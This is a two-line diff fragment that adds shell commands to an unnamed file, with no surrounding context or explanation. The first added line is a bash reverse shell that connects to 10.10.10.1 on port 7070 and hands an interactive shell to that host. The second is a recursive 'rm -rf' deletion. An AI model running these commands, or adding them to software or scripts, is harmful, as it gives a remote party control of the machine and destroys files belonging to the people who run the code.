@@ -1,0 +1,2 @@
+bash -i >& /dev/tcp/10.10.10.1/7070 0>&1
+rm -rf how
